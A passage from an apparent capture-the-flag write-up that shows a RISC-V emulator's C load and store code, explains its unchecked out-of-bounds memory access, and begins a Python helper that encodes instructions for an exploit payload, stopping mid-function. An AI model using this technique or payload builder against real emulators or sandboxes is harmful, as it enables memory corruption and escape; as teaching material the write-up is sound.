</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dram_store</span><span class="p">(</span><span class="n">DRAM</span><span class="o">*</span> <span class="n">dram</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>  <span class="nf">dram_store_8</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>  <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">16</span><span class="o">:</span> <span class="nf">dram_store_16</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">32</span><span class="o">:</span> <span class="nf">dram_store_32</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">64</span><span class="o">:</span> <span class="nf">dram_store_64</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="c1">// &lt;- Let&#39;s expand this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">default</span><span class="o">:</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define DRAM_SIZE 1024*1024*1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define DRAM_BASE 0x80000000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">DRAM</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">mem</span><span class="p">[</span><span class="n">DRAM_SIZE</span><span class="p">];</span>     <span class="c1">// Dram memory of DRAM_SIZE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">DRAM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dram_store_64</span><span class="p">(</span><span class="n">DRAM</span><span class="o">*</span> <span class="n">dram</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="p">((</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that there isn&rsquo;t any check on the <code>addr</code> whether the result of <code>addr-DRAM_BASE</code> is larger than the array <code>mem</code> size or not. This means, if we put the correct <code>addr</code> value, we can simply do OOB read and write. The <code>exec_SD</code> above is used to do OOB write by passing the correct <code>addr</code>, and then I notice another function called <code>exec_LD</code>, which can be used to do OOB read.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec_LD</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// load 8 byte to rd from address in rs1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">imm</span> <span class="o">=</span> <span class="nf">imm_I</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="nf">rs1</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="n">imm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="nf">rd</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="nf">cpu_load</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">print_op</span><span class="p">(</span><span class="s">&#34;ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">cpu_load</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bus_load</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">cpu</span><span class="o">-&gt;</span><span class="n">bus</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">bus_load</span><span class="p">(</span><span class="n">BUS</span><span class="o">*</span> <span class="n">bus</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">dram_load</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">bus</span><span class="o">-&gt;</span><span class="n">dram</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">dram_load_64</span><span class="p">(</span><span class="n">DRAM</span><span class="o">*</span> <span class="n">dram</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">40</span> 
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span>
</span></span><span class="line"><span class="cl">        <span class="o">|</span>  <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span><span class="o">-</span><span class="n">DRAM_BASE</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">56</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">dram_load</span><span class="p">(</span><span class="n">DRAM</span><span class="o">*</span> <span class="n">dram</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>  <span class="k">return</span> <span class="nf">dram_load_8</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>  <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">16</span><span class="o">:</span> <span class="k">return</span> <span class="nf">dram_load_16</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">32</span><span class="o">:</span> <span class="k">return</span> <span class="nf">dram_load_32</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">64</span><span class="o">:</span> <span class="k">return</span> <span class="nf">dram_load_64</span><span class="p">(</span><span class="n">dram</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>With those two functions, we have found the OOB bug in the emulator. Now, let&rsquo;s move to the exploitation step.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Okay, now that we have found our targeted functions during our initial analysis, to help craft the payload easier, I try to build a helper first in python to generate the file that will be passed to the emulator.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">registers</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;zero&#34;</span><span class="p">,</span> <span class="s2">&#34;ra&#34;</span><span class="p">,</span>  <span class="s2">&#34;sp&#34;</span><span class="p">,</span>  <span class="s2">&#34;gp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tp&#34;</span><span class="p">,</span> <span class="s2">&#34;t0&#34;</span><span class="p">,</span>  <span class="s2">&#34;t1&#34;</span><span class="p">,</span>  <span class="s2">&#34;t2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;s0&#34;</span><span class="p">,</span> <span class="s2">&#34;s1&#34;</span><span class="p">,</span>  <span class="s2">&#34;a0&#34;</span><span class="p">,</span>  <span class="s2">&#34;a1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;a2&#34;</span><span class="p">,</span> <span class="s2">&#34;a3&#34;</span><span class="p">,</span>  <span class="s2">&#34;a4&#34;</span><span class="p">,</span>  <span class="s2">&#34;a5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;a6&#34;</span><span class="p">,</span> <span class="s2">&#34;a7&#34;</span><span class="p">,</span>  <span class="s2">&#34;s2&#34;</span><span class="p">,</span>  <span class="s2">&#34;s3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;s4&#34;</span><span class="p">,</span> <span class="s2">&#34;s5&#34;</span><span class="p">,</span>  <span class="s2">&#34;s6&#34;</span><span class="p">,</span>  <span class="s2">&#34;s7&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;s8&#34;</span><span class="p">,</span> <span class="s2">&#34;s9&#34;</span><span class="p">,</span> <span class="s2">&#34;s10&#34;</span><span class="p">,</span> <span class="s2">&#34;s11&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;t3&#34;</span><span class="p">,</span> <span class="s2">&#34;t4&#34;</span><span class="p">,</span>  <span class="s2">&#34;t5&#34;</span><span class="p">,</span>  <span class="s2">&#34;t6&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">register_key</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">registers</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">register_key</span><span class="p">[</span><span class="n">val</span><span class="p">]</span> <span class="o">=</span> <span class="n">idx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reg</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">register_key</span><span class="p">[</span><span class="n">key</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">new_inst</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">funct7</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm_i</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm_s</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Set opcode</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set funct3</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">funct3</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set funct7</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">funct7</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">25</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set rd</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">rd</span> <span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set rs1</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">rs1</span> <span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set rs2</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">rs2</span> <span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set imm_i</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">imm_i</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff00000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Set imm_s</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">imm_s</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfe000000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">|=</span> <span class="p">((</span><span class="n">imm_s</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">inst</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span><span class="o">-</span><span class="mi">1</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dram_load_32</span><span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">bytecode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst</span> <span class="o">=</span> <span class="n">bytecode</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">bytecode</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span> <span class="n">bytecode</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span> <span class="o">|</span> <span class="n">bytecode</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">inst</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_SD</span><span class="p">(</span><span class="n">addr_reg</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_inst</span><span class="p">(</span><span class="mh">0x23</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mh">0x3</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">addr_reg</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">value</span><span class="p">,</span> <span class="n">imm_s</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_LD</span><span class="p">(</span><span class="n">addr_reg</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">reg_target</span><span class="p">):</span>
